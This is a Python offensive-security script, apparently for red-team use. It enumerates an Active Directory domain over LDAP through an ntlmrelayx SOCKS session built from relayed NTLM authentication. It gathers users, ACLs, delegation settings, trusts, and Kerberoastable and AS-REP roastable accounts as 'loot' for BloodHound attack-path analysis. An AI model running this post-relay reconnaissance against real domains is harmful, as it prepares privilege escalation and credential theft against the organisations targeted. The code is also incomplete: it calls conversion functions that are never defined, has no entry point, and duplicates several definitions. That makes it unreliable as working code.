#!/usr/bin/env python3
"""
LDAP Enumeration via ntlmrelayx SOCKS5 Proxy

PURPOSE:
This script enables LDAP enumeration through ntlmrelayx's SOCKS proxy when standard
tools fail. It replicates Certipy's LDAP connection method to work around ntlmrelayx
SOCKS5 LDAP implementation issues.

PROBLEM IT SOLVES:
When using ntlmrelayx with SOCKS5 proxying for LDAP sessions, most tools fail:
- impacket tools (GetADUsers, secretsdump, etc.) → "unknown LDAP binding request"
- bloodyAD → Connection closed / session terminated
- ldapdomaindump → Invalid messageId / socket receive errors
- NetExec/CrackMapExec → Index out of range errors
- Standard ldap3 scripts → Session terminated by server
- bloodhound-python → Cannot work via ntlmrelayx SOCKS

ROOT CAUSE:
ntlmrelayx's SOCKS5 LDAP proxy has limitations:
1. Only works with NTLM authentication (not anonymous or simple bind)
2. Requires SYNC strategy (not RESTARTABLE, ASYNC, etc.)
3. Needs paged_search() with generator=True for proper message sequencing
4. Standard search() operations get "invalid messageId" errors over SOCKS

WHY THIS SCRIPT WORKS:
This script uses the exact same ldap3 configuration as Certipy:
- NTLM authentication with DOMAIN\\username format
- Default SYNC client strategy (no custom strategies)
- paged_search() with generator=True for all queries
- Increased timeouts for SOCKS latency:
  * connect_timeout: 30s (connection establishment)
  * receive_timeout: 600s (10 minutes for large queries via SOCKS)
- auto_referrals=False to prevent connection issues

OUTPUT FORMATS:
1. BloodHound Legacy v4 (DEFAULT) - Compatible with BloodHound 4.2/4.3
2. BloodHound CE v5 (--bloodhound-ce) - For BloodHound Community Edition
3. BOFHound (--bofhound) - Single JSON for BOFHound tool

USAGE EXAMPLES:

1. Default - BloodHound Legacy v4 format (most compatible):
   proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u jdoe --all -o loot
   # Creates: loot_bhlegacy_YYYYMMDD_HHMMSS/ with 7 JSON files
   # Import to BloodHound 4.2 or 4.3

2. BloodHound CE v5 format:
   proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u jdoe --all -o loot --bloodhound-ce
   # Creates: loot_bhce_YYYYMMDD_HHMMSS/ with 7 JSON files
   # Import to BloodHound CE (v5.0+)

3. BOFHound format (single JSON + text files):
   proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u jdoe --all -o loot --bofhound
   # Creates: loot_YYYYMMDD_HHMMSS.json + text files

4. Specific enumeration (Kerberoastable users only):
   proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d CONTOSO -u jdoe --kerberoastable -o kerb

USAGE WITH NTLMRELAYX:
1. Start ntlmrelayx with SOCKS:
   ntlmrelayx.py -t ldap://dc.domain.local -socks

2. Capture/relay authentication to get LDAP session:
   ntlmrelayx> socks
   Protocol  Target     Username         AdminStatus  Port
   LDAP      10.10.10.10  DOMAIN/username  N/A          389

3. Run this script through proxychains:
   proxychains python3 ldap_ntlm_enum.py -H 10.10.10.10 -d DOMAIN -u username --all -o output

The script will automatically detect the base DN and enumerate users/computers.

ALTERNATIVE USE:
Can also be used for any LDAP enumeration when you have credentials, even without
SOCKS proxy - just run without proxychains.

WHAT'S COLLECTED:
- Users (with UAC flags, SPNs, delegation, ACLs)
- Computers (with OS info, delegation, ACLs)
- Groups (with membership, ACLs)
- Domain trusts
- GPOs (with ACLs)
- OUs and Containers
- Kerberoastable accounts (users with SPNs)
- AS-REP roastable accounts (no preauth required)

LIMITATIONS:
- ACLs collected as base64 (not parsed into BloodHound relationships)
- No group membership resolution (Members array empty)
- No attack path discovery without ACL parsing
- Works via ntlmrelayx SOCKS where bloodhound-python fails

CREDITS:
Based on analysis of Certipy's LDAP implementation by ly4k
https://github.com/ly4k/Certipy
"""


from ldap3 import Server, Connection, NTLM, SUBTREE, ALL_ATTRIBUTES
import sys
import argparse
import json
import base64
from datetime import datetime, timezone
from pathlib import Path

# BloodHound Legacy v4 trust mappings (integers, not strings)
TRUST_DIRECTION_MAP = {
    "Disabled": 0,
    "Inbound": 1, 
    "Outbound": 2,
    "Bidirectional": 3
}

TRUST_TYPE_MAP = {
    "Downlevel": 1,
    "Uplevel": 2,
    "ParentChild": 2,  # Same as Uplevel
    "MIT": 3,
    "DCE": 4,
    "External": 2  # Treat as Uplevel
}

# Collection method bitmasks for BloodHound Legacy v4
# DCOnly = Group + Trusts + ACL + ObjectProps + Container
COLLECTION_METHOD_GROUP = 2
COLLECTION_METHOD_TRUSTS = 8
COLLECTION_METHOD_ACL = 128
COLLECTION_METHOD_OBJECTPROPS = 1024
COLLECTION_METHOD_CONTAINER = 2048
DCONLY_BITMASK = (COLLECTION_METHOD_GROUP | COLLECTION_METHOD_TRUSTS | 
                  COLLECTION_METHOD_ACL | COLLECTION_METHOD_OBJECTPROPS | 
                  COLLECTION_METHOD_CONTAINER)  # = 3210

def sanitize_for_json(obj):
    """
    Recursively convert bytes objects to base64 strings for JSON serialization
    """
    if isinstance(obj, bytes):
        return base64.b64encode(obj).decode('utf-8')
    elif isinstance(obj, dict):
        return {k: sanitize_for_json(v) for k, v in obj.items()}
    elif isinstance(obj, list):
        return [sanitize_for_json(item) for item in obj]
    else:
        return obj

def safe_json_dump(data, file_obj, **kwargs):
    """
    Safely dump data to JSON, converting any bytes to base64 strings
    """
    sanitized_data = sanitize_for_json(data)
    json.dump(sanitized_data, file_obj, **kwargs)  # Use json.dump, not safe_json_dump!

# BloodHound Legacy trust value mappings
TRUST_DIRECTION_MAP = {
    "Disabled": 0,
    "Inbound": 1,
    "Outbound": 2,
    "Bidirectional": 3,
    "Unknown": 0
}

TRUST_TYPE_MAP = {
    "Downlevel": 1,
    "Uplevel": 2,
    "MIT": 3,
    "DCE": 4,
    "Unknown": 2
}

# DCOnly collection method bitmask for BloodHound Legacy
# Group=2, Trusts=8, ACL=128, ObjectProps=1024, Container=2048
DCONLY_BITMASK = 2 + 8 + 128 + 1024 + 2048  # = 3210

def get_base_dn(conn, domain):
    """
    Auto-detect base DN from rootDSE or construct from domain name
    """
    try:
        # Try to get defaultNamingContext from rootDSE
        conn.search(
            search_base='',
            search_filter='(objectClass=*)',
            search_scope='BASE',
            attributes=['defaultNamingContext', 'namingContexts']
        )
        
        if conn.entries:
            entry = conn.entries[0]
            if hasattr(entry, 'defaultNamingContext') and entry.defaultNamingContext:
                base_dn = str(entry.defaultNamingContext)
                print(f"[+] Detected base DN from rootDSE: {base_dn}")
                return base_dn
    except Exception as e:
        print(f"[!] Could not query rootDSE: {e}")
    
    # Fall back to constructing from domain name
    if domain:
        # Convert DOMAIN to DC=domain,DC=local or similar
        # Handle both "DOMAIN" and "domain.local" formats
        if '.' in domain:
            parts = domain.split('.')
        else:
            # Assume single-part domain, add .local
            parts = [domain, 'local']
        
        base_dn = ','.join([f'DC={part}' for part in parts])
        print(f"[*] Constructed base DN from domain: {base_dn}")
        return base_dn
    
    return None

def get_domain_info(conn, base_dn):
    """Get domain functional level, MAQ, password policy"""
    try:
        info = {}
        
        # Query domain object
        entries = conn.extend.standard.paged_search(
            search_base=base_dn,
            search_filter='(objectClass=domain)',
            search_scope='BASE',
            attributes=['msDS-Behavior-Version', 'ms-DS-MachineAccountQuota', 
                       'minPwdLength', 'pwdHistoryLength', 'lockoutThreshold',
                       'maxPwdAge', 'minPwdAge', 'lockoutDuration', 'name'],
            paged_size=10,
            generator=True
        )
        
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue
            
            attrs = entry.get('attributes', {})
            
            # Forest/Domain Functional Level
            if 'msDS-Behavior-Version' in attrs:
                level = attrs['msDS-Behavior-Version']
                if isinstance(level, list):
                    level = level[0] if level else 0
                level_map = {
                    0: "2000", 1: "2003 Interim", 2: "2003",
                    3: "2008", 4: "2008 R2", 5: "2012",
                    6: "2012 R2", 7: "2016", 10: "2025"
                }
                info['functional_level'] = level_map.get(level, f"Unknown ({level})")
            
            # Machine Account Quota
            if 'ms-DS-MachineAccountQuota' in attrs:
                maq = attrs['ms-DS-MachineAccountQuota']
                if isinstance(maq, list):
                    maq = maq[0] if maq else 0
                info['machine_account_quota'] = maq
            
            # Password Policy
            if 'minPwdLength' in attrs:
                info['min_pwd_length'] = attrs['minPwdLength'][0] if isinstance(attrs['minPwdLength'], list) else attrs['minPwdLength']
            if 'pwdHistoryLength' in attrs:
                info['pwd_history_length'] = attrs['pwdHistoryLength'][0] if isinstance(attrs['pwdHistoryLength'], list) else attrs['pwdHistoryLength']
            if 'lockoutThreshold' in attrs:
                info['lockout_threshold'] = attrs['lockoutThreshold'][0] if isinstance(attrs['lockoutThreshold'], list) else attrs['lockoutThreshold']
            
            if 'name' in attrs:
                info['domain_name'] = attrs['name'][0] if isinstance(attrs['name'], list) else attrs['name']
        
        return info
    except Exception as e:
        print(f"[-] Error getting domain info: {e}")
        return {}

def get_users(conn, base_dn):
    """Get all users with BloodHound-compatible attributes"""
    users = []
    try:
        # BloodHound.py queries these attributes
        entries = conn.extend.standard.paged_search(
            search_base=base_dn,
            search_filter='(&(objectClass=user)(objectCategory=person))',
            search_scope=SUBTREE,
            attributes=['sAMAccountName', 'userPrincipalName', 'distinguishedName',
                       'description', 'memberOf', 'userAccountControl', 
                       'adminCount', 'servicePrincipalName', 'pwdLastSet',
                       'lastLogon', 'lastLogonTimestamp', 'displayName',
                       'mail', 'title', 'homeDirectory', 'objectSid',
                       'primaryGroupID', 'sIDHistory', 'msDS-AllowedToDelegateTo',
                       'msDS-AllowedToActOnBehalfOfOtherIdentity',
                       'nTSecurityDescriptor'],  # For ACLs
            paged_size=200,
            generator=True
        )
        
        processed = 0
        for entry in entries:
            try:
                if entry['type'] != 'searchResEntry':
                    continue
                
                attrs = entry.get('attributes', {})
                user = {}
                
                # Basic attributes
                for key in ['sAMAccountName', 'userPrincipalName', 'distinguishedName', 
                           'description', 'displayName', 'mail', 'title', 'objectSid']:
                    if key in attrs:
                        val = attrs[key]
                        user[key] = val[0] if isinstance(val, list) and val else val
                
                # Group memberships
                if 'memberOf' in attrs:
                    user['memberOf'] = attrs['memberOf'] if isinstance(attrs['memberOf'], list) else [attrs['memberOf']]
                
                # User Account Control
                if 'userAccountControl' in attrs:
                    uac = attrs['userAccountControl']
                    if isinstance(uac, list):
                        uac = uac[0] if uac else 0
                    try:
                        uac = int(uac)
                    except (ValueError, TypeError):
                        uac = 0
                    user['userAccountControl'] = uac
                    user['enabled'] = not bool(uac & 0x0002)  # ACCOUNTDISABLE
                    user['trustedToAuth'] = bool(uac & 0x1000000)  # TRUSTED_TO_AUTH_FOR_DELEGATION
                    user['passwordNotRequired'] = bool(uac & 0x0020)  # PASSWD_NOTREQD
                    user['dontRequirePreauth'] = bool(uac & 0x400000)  # DONT_REQ_PREAUTH
                
                # Privileged user markers
                if 'adminCount' in attrs:
                    user['adminCount'] = attrs['adminCount'][0] if isinstance(attrs['adminCount'], list) else attrs['adminCount']
                
                # Kerberos delegation
                if 'servicePrincipalName' in attrs:
                    spns = attrs['servicePrincipalName']
                    user['servicePrincipalName'] = spns if isinstance(spns, list) else [spns]
                
                if 'msDS-AllowedToDelegateTo' in attrs:
                    delegates = attrs['msDS-AllowedToDelegateTo']
                    user['allowedToDelegateTo'] = delegates if isinstance(delegates, list) else [delegates]
                
                # RBCD
                if 'msDS-AllowedToActOnBehalfOfOtherIdentity' in attrs:
                    user['allowedToActOnBehalfOfOtherIdentity'] = True
                
                # Primary group
                if 'primaryGroupID' in attrs:
                    user['primaryGroupID'] = attrs['primaryGroupID'][0] if isinstance(attrs['primaryGroupID'], list) else attrs['primaryGroupID']
                
                # SID History (privilege escalation vector)
                if 'sIDHistory' in attrs:
                    history = attrs['sIDHistory']
                    user['sIDHistory'] = history if isinstance(history, list) else [history]
                
                # Security descriptor for ACLs (convert to base64 for storage)
                if 'nTSecurityDescriptor' in attrs:
                    sd = attrs['nTSecurityDescriptor']
                    if sd:
                        if isinstance(sd, bytes):
                            user['nTSecurityDescriptor'] = base64.b64encode(sd).decode('utf-8')
                        elif isinstance(sd, list) and sd:
                            user['nTSecurityDescriptor'] = base64.b64encode(sd[0]).decode('utf-8')
                
                users.append(user)
                processed += 1
                if processed % 1000 == 0:
                    print(f"    ... processed {processed} users", file=sys.stderr)
            
            except (KeyError, ValueError, TypeError) as e:
                # Skip corrupted entries from SOCKS proxy
                print(f"[!] Warning: Skipping corrupted entry: {e}", file=sys.stderr)
                continue
            except Exception as e:
                print(f"[!] Warning: Error processing entry: {e}", file=sys.stderr)
                continue
        
    except Exception as e:
        print(f"[-] Error getting users: {e}")
        import traceback
        traceback.print_exc()
    
    return users

def get_computers(conn, base_dn):
    """Get all computers with BloodHound-compatible attributes"""
    computers = []
    try:
        entries = conn.extend.standard.paged_search(
            search_base=base_dn,
            search_filter='(objectClass=computer)',
            search_scope=SUBTREE,
            attributes=['dNSHostName', 'sAMAccountName', 'distinguishedName',
                       'operatingSystem', 'operatingSystemVersion', 
                       'userAccountControl', 'servicePrincipalName',
                       'lastLogon', 'lastLogonTimestamp', 'pwdLastSet',
                       'objectSid', 'primaryGroupID', 
                       'msDS-AllowedToDelegateTo',
                       'msDS-AllowedToActOnBehalfOfOtherIdentity',
                       'nTSecurityDescriptor'],
            paged_size=200,
            generator=True
        )
        
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue
            
            attrs = entry.get('attributes', {})
            computer = {}
            
            for key in ['dNSHostName', 'sAMAccountName', 'distinguishedName', 
                       'operatingSystem', 'operatingSystemVersion', 'objectSid']:
                if key in attrs:
                    val = attrs[key]
                    computer[key] = val[0] if isinstance(val, list) and val else val
            
            if 'userAccountControl' in attrs:
                uac = attrs['userAccountControl']
                if isinstance(uac, list):
                    uac = uac[0] if uac else 0
                try:
                    uac = int(uac)
                except (ValueError, TypeError):
                    uac = 0
                computer['userAccountControl'] = uac
                computer['enabled'] = not bool(uac & 0x0002)
                computer['trustedToAuth'] = bool(uac & 0x1000000)  # TRUSTED_TO_AUTH_FOR_DELEGATION
                computer['unconstrainedDelegation'] = bool(uac & 0x80000)  # TRUSTED_FOR_DELEGATION
            
            # Delegation attributes
            if 'msDS-AllowedToDelegateTo' in attrs:
                delegates = attrs['msDS-AllowedToDelegateTo']
                computer['allowedToDelegateTo'] = delegates if isinstance(delegates, list) else [delegates]
            
            if 'msDS-AllowedToActOnBehalfOfOtherIdentity' in attrs:
                computer['allowedToActOnBehalfOfOtherIdentity'] = True
            
            # Security descriptor for ACLs
            if 'nTSecurityDescriptor' in attrs:
                sd = attrs['nTSecurityDescriptor']
                if sd:
                    import base64
                    if isinstance(sd, bytes):
                        computer['nTSecurityDescriptor'] = base64.b64encode(sd).decode('utf-8')
                    elif isinstance(sd, list) and sd:
                        computer['nTSecurityDescriptor'] = base64.b64encode(sd[0]).decode('utf-8')
            
            computers.append(computer)
        
    except Exception as e:
        print(f"[-] Error getting computers: {e}")
    
    return computers

def get_groups(conn, base_dn):
    """Get all groups with BloodHound-compatible attributes"""
    groups = []
    try:
        entries = conn.extend.standard.paged_search(
            search_base=base_dn,
            search_filter='(objectClass=group)',
            search_scope=SUBTREE,
            attributes=['sAMAccountName', 'distinguishedName', 'description',
                       'member', 'adminCount', 'groupType', 'objectSid',
                       'nTSecurityDescriptor'],
            paged_size=200,
            generator=True
        )
        
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue
            
            attrs = entry.get('attributes', {})
            group = {}
            
            for key in ['sAMAccountName', 'distinguishedName', 'description', 'objectSid']:
                if key in attrs:
                    val = attrs[key]
                    group[key] = val[0] if isinstance(val, list) and val else val
            
            if 'member' in attrs:
                group['member'] = attrs['member'] if isinstance(attrs['member'], list) else [attrs['member']]
                group['member_count'] = len(group['member'])
            
            if 'adminCount' in attrs:
                group['adminCount'] = attrs['adminCount'][0] if isinstance(attrs['adminCount'], list) else attrs['adminCount']
            
            if 'groupType' in attrs:
                gt = attrs['groupType']
                if isinstance(gt, list):
                    gt = gt[0] if gt else 0
                try:
                    gt = int(gt)
                except (ValueError, TypeError):
                    gt = 0
                group['groupType'] = gt
                # -2147483646 = Global security group
                # -2147483644 = Domain local security group
                # -2147483643 = Builtin local security group
                # -2147483640 = Universal security group
                group['isSecurityGroup'] = bool(gt & 0x80000000)
            
            # Security descriptor for ACLs
            if 'nTSecurityDescriptor' in attrs:
                sd = attrs['nTSecurityDescriptor']
                if sd:
                    import base64
                    if isinstance(sd, bytes):
                        group['nTSecurityDescriptor'] = base64.b64encode(sd).decode('utf-8')
                    elif isinstance(sd, list) and sd:
                        group['nTSecurityDescriptor'] = base64.b64encode(sd[0]).decode('utf-8')
            
            groups.append(group)
        
    except Exception as e:
        print(f"[-] Error getting groups: {e}")
    
    return groups

def get_trusts(conn, base_dn):
    """Get all domain trusts"""
    trusts = []
    try:
        entries = conn.extend.standard.paged_search(
            search_base=f"CN=System,{base_dn}",
            search_filter='(objectClass=trustedDomain)',
            search_scope=SUBTREE,
            attributes=['name', 'trustPartner', 'trustDirection', 'trustType', 
                       'trustAttributes', 'flatName'],
            paged_size=50,
            generator=True
        )
        
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue
            
            attrs = entry.get('attributes', {})
            trust = {}
            
            for key in ['name', 'trustPartner', 'flatName']:
                if key in attrs:
                    val = attrs[key]
                    trust[key] = val[0] if isinstance(val, list) and val else val
            
            if 'trustDirection' in attrs:
                direction = attrs['trustDirection']
                if isinstance(direction, list):
                    direction = direction[0] if direction else 0
                direction_map = {0: "Disabled", 1: "Inbound", 2: "Outbound", 3: "Bidirectional"}
                trust['trustDirection'] = direction_map.get(direction, f"Unknown ({direction})")
            
            if 'trustType' in attrs:
                ttype = attrs['trustType']
                if isinstance(ttype, list):
                    ttype = ttype[0] if ttype else 0
                type_map = {1: "Downlevel", 2: "Uplevel", 3: "MIT", 4: "DCE"}
                trust['trustType'] = type_map.get(ttype, f"Unknown ({ttype})")
            
            trusts.append(trust)
        
    except Exception as e:
        print(f"[-] Error getting trusts: {e}")
    
    return trusts

def get_gpos(conn, base_dn):
    """Get all GPOs with ACL information"""
    gpos = []
    try:
        entries = conn.extend.standard.paged_search(
            search_base=f"CN=Policies,CN=System,{base_dn}",
            search_filter='(objectClass=groupPolicyContainer)',
            search_scope=SUBTREE,
            attributes=['displayName', 'name', 'gPCFileSysPath', 'distinguishedName',
                       'objectSid', 'nTSecurityDescriptor'],
            paged_size=100,
            generator=True
        )
        
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue
            
            attrs = entry.get('attributes', {})
            gpo = {}
            
            for key in ['displayName', 'name', 'gPCFileSysPath', 'distinguishedName', 'objectSid']:
                if key in attrs:
                    val = attrs[key]
                    gpo[key] = val[0] if isinstance(val, list) and val else val
            
            # Security descriptor for ACLs
            if 'nTSecurityDescriptor' in attrs:
                sd = attrs['nTSecurityDescriptor']
                if sd:
                    import base64
                    if isinstance(sd, bytes):
                        gpo['nTSecurityDescriptor'] = base64.b64encode(sd).decode('utf-8')
                    elif isinstance(sd, list) and sd:
                        gpo['nTSecurityDescriptor'] = base64.b64encode(sd[0]).decode('utf-8')
            
            gpos.append(gpo)
        
    except Exception as e:
        print(f"[-] Error getting GPOs: {e}")
    
    return gpos

def get_ous(conn, base_dn):
    """Get all OUs"""
    ous = []
    try:
        entries = conn.extend.standard.paged_search(
            search_base=base_dn,
            search_filter='(objectClass=organizationalUnit)',
            search_scope=SUBTREE,
            attributes=['name', 'distinguishedName', 'description', 'gPLink'],
            paged_size=200,
            generator=True
        )
        
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue
            
            attrs = entry.get('attributes', {})
            ou = {}
            
            for key in ['name', 'distinguishedName', 'description', 'gPLink']:
                if key in attrs:
                    val = attrs[key]
                    ou[key] = val[0] if isinstance(val, list) and val else val
            
            ous.append(ou)
        
    except Exception as e:
        print(f"[-] Error getting OUs: {e}")
    
    return ous

def get_containers(conn, base_dn):
    """Get all containers"""
    containers = []
    try:
        entries = conn.extend.standard.paged_search(
            search_base=base_dn,
            search_filter='(objectClass=container)',
            search_scope=SUBTREE,
            attributes=['name', 'distinguishedName', 'description'],
            paged_size=200,
            generator=True
        )
        
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue
            
            attrs = entry.get('attributes', {})
            container = {}
            
            for key in ['name', 'distinguishedName', 'description']:
                if key in attrs:
                    val = attrs[key]
                    container[key] = val[0] if isinstance(val, list) and val else val
            
            containers.append(container)
        
    except Exception as e:
        print(f"[-] Error getting containers: {e}")
    
    return containers

def get_kerberoastable(conn, base_dn):
    """Get Kerberoastable accounts (users with SPN) - optimized for large environments"""
    kerberoastable = []
    try:
        # Optimized: Use samAccountType instead of objectCategory (indexed attribute)
        # 805306368 = USER_OBJECT (excludes computers which are 805306369)
        entries = conn.extend.standard.paged_search(
            search_base=base_dn,
            search_filter='(&(samAccountType=805306368)(servicePrincipalName=*))',
            search_scope=SUBTREE,
            attributes=['sAMAccountName', 'userPrincipalName', 'servicePrincipalName',
                       'distinguishedName', 'memberOf', 'pwdLastSet'],
            paged_size=500,  # Larger page size for better performance
            generator=True
        )
        
        count = 0
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue
            
            count += 1
            if count % 50 == 0:
                print(f"    ... {count} accounts", end='\r')
            
            attrs = entry.get('attributes', {})
            account = {}
            
            for key in ['sAMAccountName', 'userPrincipalName', 'distinguishedName']:
                if key in attrs:
                    val = attrs[key]
                    account[key] = val[0] if isinstance(val, list) and val else val
            
            if 'servicePrincipalName' in attrs:
                spns = attrs['servicePrincipalName']
                account['servicePrincipalName'] = spns if isinstance(spns, list) else [spns]
                account['spn_count'] = len(account['servicePrincipalName'])
            
            if 'memberOf' in attrs:
                account['memberOf'] = attrs['memberOf'] if isinstance(attrs['memberOf'], list) else [attrs['memberOf']]
            
            if 'pwdLastSet' in attrs:
                account['pwdLastSet'] = attrs['pwdLastSet'][0] if isinstance(attrs['pwdLastSet'], list) else attrs['pwdLastSet']
            
            kerberoastable.append(account)
        
        if count > 0:
            print(f"    ... {count} total         ")
        
    except Exception as e:
        print(f"[-] Error getting Kerberoastable accounts: {e}")
    
    return kerberoastable
    
    return kerberoastable

def get_asreproastable(conn, base_dn):
    """Get AS-REP roastable accounts (no Kerberos pre-auth required) - optimized"""
    asreproastable = []
    try:
        # Optimized: Use samAccountType for better performance
        # DONT_REQ_PREAUTH = 0x400000 (4194304)
        entries = conn.extend.standard.paged_search(
            search_base=base_dn,
            search_filter='(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
            search_scope=SUBTREE,
            attributes=['sAMAccountName', 'userPrincipalName', 'distinguishedName',
                       'userAccountControl', 'memberOf', 'pwdLastSet'],
            paged_size=500,
            generator=True
        )
        
        count = 0
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue
            
            count += 1
            if count % 50 == 0:
                print(f"    ... {count} accounts", end='\r')
            
            attrs = entry.get('attributes', {})
            account = {}
            
            for key in ['sAMAccountName', 'userPrincipalName', 'distinguishedName']:
                if key in attrs:
                    val = attrs[key]
                    account[key] = val[0] if isinstance(val, list) and val else val
            
            if 'userAccountControl' in attrs:
                uac = attrs['userAccountControl']
                if isinstance(uac, list):
                    uac = uac[0] if uac else 0
                try:
                    uac = int(uac)
                except (ValueError, TypeError):
                    uac = 0
                account['userAccountControl'] = uac
            
            if 'memberOf' in attrs:
                account['memberOf'] = attrs['memberOf'] if isinstance(attrs['memberOf'], list) else [attrs['memberOf']]
            
            if 'pwdLastSet' in attrs:
                account['pwdLastSet'] = attrs['pwdLastSet'][0] if isinstance(attrs['pwdLastSet'], list) else attrs['pwdLastSet']
            
            asreproastable.append(account)
        
        if count > 0:
            print(f"    ... {count} total         ")
        
    except Exception as e:
        print(f"[-] Error getting AS-REP roastable accounts: {e}")
    
    return asreproastable
    
    return asreproastable

# Display functions
def display_users(users):
    """Display users in readable format"""
    print(f"\n{'='*70}")
    print("USERS (showing first 20):")
    print('='*70)
    for user in users[:20]:
        print(f"\n{user.get('sAMAccountName', 'N/A')}")
        if 'userPrincipalName' in user:
            print(f"  UPN: {user['userPrincipalName']}")
        if 'description' in user:
            print(f"  Description: {user['description']}")
        if user.get('adminCount'):
            print(f"  [!] AdminCount: {user['adminCount']}")

def display_computers(computers):
    """Display computers in readable format"""
    print(f"\n{'='*70}")
    print("COMPUTERS (showing first 20):")
    print('='*70)
    for computer in computers[:20]:
        print(f"\n{computer.get('dNSHostName', computer.get('sAMAccountName', 'N/A'))}")
        if 'operatingSystem' in computer:
            print(f"  OS: {computer['operatingSystem']}")

def display_groups(groups):
    """Display groups in readable format"""
    print(f"\n{'='*70}")
    print("GROUPS (showing first 20):")
    print('='*70)
    for group in groups[:20]:
        print(f"\n{group.get('sAMAccountName', 'N/A')}")
        if 'description' in group:
            print(f"  Description: {group['description']}")
        if 'member_count' in group:
            print(f"  Members: {group['member_count']}")

def display_trusts(trusts):
    """Display trusts in readable format"""
    print(f"\n{'='*70}")
    print("TRUSTS:")
    print('='*70)
    for trust in trusts:
        print(f"\n{trust.get('trustPartner', 'N/A')}")
        if 'trustDirection' in trust:
            print(f"  Direction: {trust['trustDirection']}")
        if 'trustType' in trust:
            print(f"  Type: {trust['trustType']}")

def display_kerberoastable(accounts):
    """Display Kerberoastable accounts"""
    print(f"\n{'='*70}")
    print("KERBEROASTABLE ACCOUNTS:")
    print('='*70)
    for account in accounts:
        print(f"\n{account.get('sAMAccountName', 'N/A')}")
        if 'servicePrincipalName' in account:
            for spn in account['servicePrincipalName'][:3]:
                print(f"  SPN: {spn}")

def display_asreproastable(accounts):
    """Display AS-REP roastable accounts"""
    print(f"\n{'='*70}")
    print("AS-REP ROASTABLE ACCOUNTS:")
    print('='*70)
    for account in accounts:
        print(f"  {account.get('sAMAccountName', 'N/A')}")

def save_output(data, output_dir, domain, output_format='legacy'):
    """
    Save output in specified format
    
    Formats:
    - 'legacy': BloodHound Legacy v4 (default)
    - 'ce': BloodHound CE v5
    - 'bofhound': BOFHound custom format
    """
    try:
        # Use current directory if output_dir is just a filename
        if output_dir and not ('/' in output_dir or '\\' in output_dir):
            output_path = Path.cwd()
            base_name = output_dir.replace('.json', '').replace('.txt', '')
        else:
            output_path = Path(output_dir) if output_dir else Path.cwd()
            output_path.mkdir(parents=True, exist_ok=True)
            base_name = None
        
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        
        # Handle different output formats
        if output_format == 'bofhound':
            # BOFHound single JSON format
            if base_name:
                json_filename = output_path / f"{base_name}_{timestamp}.json"
            else:
                json_filename = output_path / f"ldap_enum_{domain}_{timestamp}.json"
            
            # Sanitize bytes objects before JSON serialization
            sanitized_data = sanitize_for_json(data)
            
            with open(json_filename, 'w') as f:
                safe_json_dump(sanitized_data, f, indent=2)
            
            print(f"\n[+] BOFHound JSON saved to: {json_filename}")
            print(f"[*] BOFHound import: bofhound -i {json_filename}")
            
            # Save text files for BOFHound format
            save_text_files(data, output_path, domain, timestamp, base_name)
            
        elif output_format in ['legacy', 'ce']:
            # BloodHound formats (separate JSON files)
            print(f"\n[*] Converting to BloodHound {'Legacy v4' if output_format == 'legacy' else 'CE v5'} format...")
            
            # Create subdirectory
            if base_name:
                bh_dir = output_path / f"{base_name}_bh{'legacy' if output_format == 'legacy' else 'ce'}_{timestamp}"
            else:
                bh_dir = output_path / f"bh{'legacy' if output_format == 'legacy' else 'ce'}_{domain}_{timestamp}"
            
            bh_dir.mkdir(parents=True, exist_ok=True)
            
            # Generate separate JSON files
            if output_format == 'legacy':
                files_created = convert_to_bloodhound_legacy(data, domain, bh_dir)
            else:
                files_created = convert_to_bloodhound_ce(data, domain, bh_dir)
            
            print(f"\n[+] BloodHound {'Legacy' if output_format == 'legacy' else 'CE'} files saved to: {bh_dir}/")
            for filename in files_created:
                print(f"    - {filename}")
            print(f"\n[*] Import to BloodHound via GUI or:")
            print(f"    cd {bh_dir} && zip -r ../bloodhound_{timestamp}.zip *.json")
        
    except Exception as e:
        print(f"[-] Error saving output: {e}")
        import traceback
        traceback.print_exc()

def save_text_files(data, output_path, domain, timestamp, base_name=None):
    """Save simple text file outputs"""
    if 'users' in data.get('data', {}) and data['data']['users']:
        if base_name:
            users_file = output_path / f"{base_name}_users_{timestamp}.txt"
        else:
            users_file = output_path / f"users_{domain}_{timestamp}.txt"
        
        with open(users_file, 'w') as f:
            for user in data['data']['users']:
                sam = user.get('sAMAccountName', '')
                if sam:
                    f.write(f"{sam}\n")
        print(f"[+] Users list saved to: {users_file}")
    
    if 'computers' in data.get('data', {}) and data['data']['computers']:
        if base_name:
            computers_file = output_path / f"{base_name}_computers_{timestamp}.txt"
        else:
            computers_file = output_path / f"computers_{domain}_{timestamp}.txt"
        
        with open(computers_file, 'w') as f:
            for computer in data['data']['computers']:
                hostname = computer.get('dNSHostName') or computer.get('sAMAccountName', '')
                if hostname:
                    f.write(f"{hostname}\n")
        print(f"[+] Computers list saved to: {computers_file}")
    
    if 'kerberoastable' in data.get('data', {}) and data['data']['kerberoastable']:
        if base_name:
            kerb_file = output_path / f"{base_name}_kerberoastable_{timestamp}.txt"
        else:
            kerb_file = output_path / f"kerberoastable_{domain}_{timestamp}.txt"
        
        with open(kerb_file, 'w') as f:
            for account in data['data']['kerberoastable']:
                sam = account.get('sAMAccountName', '')
                if sam:
                    f.write(f"{sam}\n")
        print(f"[+] Kerberoastable accounts saved to: {kerb_file}")
    
    if 'asreproastable' in data.get('data', {}) and data['data']['asreproastable']:
        if base_name:
            asrep_file = output_path / f"{base_name}_asreproastable_{timestamp}.txt"
        else:
            asrep_file = output_path / f"asreproastable_{domain}_{timestamp}.txt"
        
        with open(asrep_file, 'w') as f:
            for account in data['data']['asreproastable']:
                sam = account.get('sAMAccountName', '')
                if sam:
                    f.write(f"{sam}\n")
